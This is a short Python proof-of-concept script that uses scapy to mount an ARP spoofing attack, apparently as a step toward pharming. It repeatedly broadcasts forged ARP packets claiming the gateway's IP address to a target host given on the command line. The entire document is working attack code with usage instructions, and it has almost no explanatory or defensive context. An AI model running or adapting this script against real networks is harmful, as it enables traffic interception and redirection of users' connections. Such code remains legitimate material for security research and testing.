# ARP Spoofing Attack script
# Usage:
#   python3 pharming_poc.py AGL_IP AGL_MAC GATEWAY

import sys
import time
from scapy.all import *

DELAY = 0.5
BROADCAST = "ff:ff:ff:ff:ff:ff"

if __name__ == "__main__":
    # Commandline arguments
    agl_ip = sys.argv[1]
    agl_mac = sys.argv[2]
    gateway = sys.argv[3]

    # ARP Spoofing packet
    packet = ARP()
    packet.psrc = gateway
    packet.pdst = agl_ip
    packet.hwsrc = agl_mac
    packet.hwdst = BROADCAST

    while True:
        try:
            # Send malicious ARP packet
            send(
                packet, 
                inter = 0.0,
                count = 1,
                verbose = False
            )
        except:
            pass
        time.sleep(DELAY)